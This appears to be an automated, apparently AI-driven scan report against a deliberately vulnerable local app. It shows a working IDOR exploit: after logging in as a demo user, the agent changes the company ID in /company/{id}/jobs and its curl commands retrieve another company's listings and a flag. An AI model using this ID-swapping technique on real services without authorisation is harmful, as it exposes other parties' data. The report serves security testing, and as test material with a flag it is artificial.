# Bounter Scan Report

**Target:** http://localhost:8000/
**Description:** A simple IDOR vulnerability when fetching a list of jobs for different companies
**Started:** 2025-11-19T12:12:19.878067+00:00
**Finished:** 2025-11-19T12:12:56.639765+00:00
**Commands Executed:** 7

## Thinking Summary

- **A Successful IDOR Discovery**

Okay, so I just got a successful GET response from `http://localhost:8000/company/2/jobs`. The page loads and, bingo, there's the flag: `flag{cfbc7583-4a96-4662-835b-81c9f5317b56}`. This confirms what I suspected â€“ an Insecure Direct Object Reference (IDOR) vulnerability. By simply changing the `company_id` in the URL from `1` to `2`, I could access data, in this case job listings, that I shouldn't have access to, especially since I'm logged in as a demo user.

I've got a solid PoC now.  I can reproduce it consistently: log in as 'demo', visit `http://localhost:8000/company/1/jobs` to confirm the initial state, then just swap the ID to `2` and there it is. The flag is the smoking gun!

That's it, I can stop testing.  I've got a clear vulnerability: the `/company/{company_id}/jobs` endpoint is vulnerable to IDOR. The application allows unauthorized access to company data simply by modifying the URL. This is reproducible, and I've got a complete PoC ready to go. Time to compile the report.


## Final Analysis
Vulnerability Found: Insecure Direct Object Reference (IDOR)

Endpoint: `/company/{company_id}/jobs`

Description: The application is vulnerable to IDOR when fetching job listings. By manipulating the `company_id` in the URL, an authenticated user can access job information belonging to other companies.

Proof of Concept:
1.  Log in using the demo credentials (Username: `demo`, Password: `demo`).
2.  Access the jobs for company ID `1` via the URL: `http://localhost:8000/company/1/jobs`. This displays jobs for "Company 1".
3.  Access the jobs for company ID `2` via the URL: `http://localhost:8000/company/2/jobs`. This request successfully retrieves and displays job listings for "Company 2", which includes the following flag: `flag{cfbc7583-4a96-4662-835b-81c9f5317b56}`.

## Commands
- `curl http://localhost:8000/` (success=True, return_code=0)
  - stdout: <!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <title>Login</title>
</head>
<body>
    <div class="container">
        
<h2>Login</h2>


<p>To try the app you can use the demo account: <strong>Username:</strong> demo, <strong>Password:</strong> demo</p>

<form method="post" action="/token">
    <div class="form-group">
        <label for="username">Company Name</label>
        <input type="text" class="form-control" id="username" name="username" required>
    </div>
    <div class="form-group">
        <label for="password">Password</label>
        <input type="password" class="form-control" id="password" name="password" required>
    </div>
    <button type="submit" class="btn btn-primary">Login</button>
</form>

    </div>
</body>
</html>
  - stderr: % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed

  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
100   957  100   957    0     0   388k      0 --:--:-- --:--:-- --:--:--  467k
- `curl -c cookies.txt -X POST -d "username=demo&password=demo" http://localhost:8000/token` (success=True, return_code=0)
  - stdout: <empty>
  - stderr: % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed

  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
100    27    0     0  100    27      0    131 --:--:-- --:--:-- --:--:--   131
- `curl -b cookies.txt http://localhost:8000/jobs` (success=True, return_code=0)
  - stdout: {"detail":"Not Found"}
  - stderr: % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed

  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
100    22  100    22    0     0  20560      0 --:--:-- --:--:-- --:--:-- 22000
- `curl -b cookies.txt http://localhost:8000/` (success=True, return_code=0)
  - stdout: <!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <title>Login</title>
</head>
<body>
    <div class="container">
        
<h2>Login</h2>


<p>To try the app you can use the demo account: <strong>Username:</strong> demo, <strong>Password:</strong> demo</p>

<form method="post" action="/token">
    <div class="form-group">
        <label for="username">Company Name</label>
        <input type="text" class="form-control" id="username" name="username" required>
    </div>
    <div class="form-group">
        <label for="password">Password</label>
        <input type="password" class="form-control" id="password" name="password" required>
    </div>
    <button type="submit" class="btn btn-primary">Login</button>
</form>

    </div>
</body>
</html>
  - stderr: % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed

  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
100   957  100   957    0     0   680k      0 --:--:-- --:--:-- --:--:--  934k
- `curl -v -L -c cookies.txt -X POST -d "username=demo&password=demo" http://localhost:8000/token` (success=True, return_code=0)
  - stdout: {"detail":"Method Not Allowed"}
  - stderr: Note: Unnecessary use of -X or --request, POST is already inferred.
* Host localhost:8000 was resolved.
* IPv6: ::1
* IPv4: 127.0.0.1
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed

  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0*   Trying [::1]:8000...
* Connected to localhost (::1) port 8000
* using HTTP/1.x
> POST /token HTTP/1.1
> Host: localhost:8000
> User-Agent: curl/8.15.0
> Accept: */*
> Content-Length: 27
> Content-Type: application/x-www-form-urlencoded
> 
} [27 bytes data]
* upload completely sent off: 27 bytes
< HTTP/1.1 303 See Other
< date: Wed, 19 Nov 2025 12:12:39 GMT
< server: uvicorn
< content-length: 0
* Need to rewind upload for next request
< location: /company/1/jobs
* Added cookie access_token=""Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJkZW1vIiwiZXhwIjoxNzYzNTU2MTYwfQ.LsPCEWvZPe3LQrFslOva5jOS423ll5kE6ZAEAMFlUP8"" for domain localhost, path /, expire 0
< set-cookie: access_token="Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJkZW1vIiwiZXhwIjoxNzYzNTU2MTYwfQ.LsPCEWvZPe3LQrFslOva5jOS423ll5kE6ZAEAMFlUP8"; HttpOnly; Path=/; SameSite=lax
* Ignoring the response-body
* setting size while ignoring
< 

100    27    0     0  100    27      0    138 --:--:-- --:--:-- --:--:--   139
* Connection #0 to host localhost left intact
* Issue another request to this URL: 'http://localhost:8000/company/1/jobs'
* Stick to POST instead of GET
* Re-using existing http: connection with host localhost
> POST /company/1/jobs HTTP/1.1
> Host: localhost:8000
> User-Agent: curl/8.15.0
> Accept: */*
> Cookie: access_token="Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJkZW1vIiwiZXhwIjoxNzYzNTU2MTYwfQ.LsPCEWvZPe3LQrFslOva5jOS423ll5kE6ZAEAMFlUP8"
> 
* Request completely sent off
< HTTP/1.1 405 Method Not Allowed
< date: Wed, 19 Nov 2025 12:12:39 GMT
< server: uvicorn
< allow: GET
< content-length: 31
< content-type: application/json
< 
{ [31 bytes data]

100    31  100    31    0     0    159      0 --:--:-- --:--:-- --:--:--   159
* Connection #0 to host localhost left intact
- `curl -b cookies.txt http://localhost:8000/company/1/jobs` (success=True, return_code=0)
  - stdout: <!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <title>Jobs</title>
</head>
<body>
    <div class="container">
        
<h2>Jobs for Company 1</h2>
<ul class="list-group">
    
    <li class="list-group-item">
        <p>demo Job 1:demo Job 1 Description</p>
    </li>
    
    <li class="list-group-item">
        <p>demo Job 2:demo Job 2 Description</p>
    </li>
    
</ul>

    </div>
</body>
</html>
  - stderr: % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed

  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
100   610  100   610    0     0   103k      0 --:--:-- --:--:-- --:--:--  119k
- `curl -b cookies.txt http://localhost:8000/company/2/jobs` (success=True, return_code=0)
  - stdout: <!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <title>Jobs</title>
</head>
<body>
    <div class="container">
        
<h2>Jobs for Company 2</h2>
<ul class="list-group">
    
    <li class="list-group-item">
        <p>company2 Job 1:company2 Job 1 Description</p>
    </li>
    
    <li class="list-group-item">
        <p>company2 Job 2:company2 Job 2 Description</p>
    </li>
    
    <li class="list-group-item">
        <p>secret:flag{cfbc7583-4a96-4662-835b-81c9f5317b56}</p>
    </li>
    
</ul>

    </div>
</body>
</html>
  - stderr: % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed

  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
100   739  100   739    0     0   254k      0 --:--:-- --:--:-- --:--:--  360k

## Token Usage
- Thinking tokens: 459
- Output tokens: 224
- Total tokens: 6478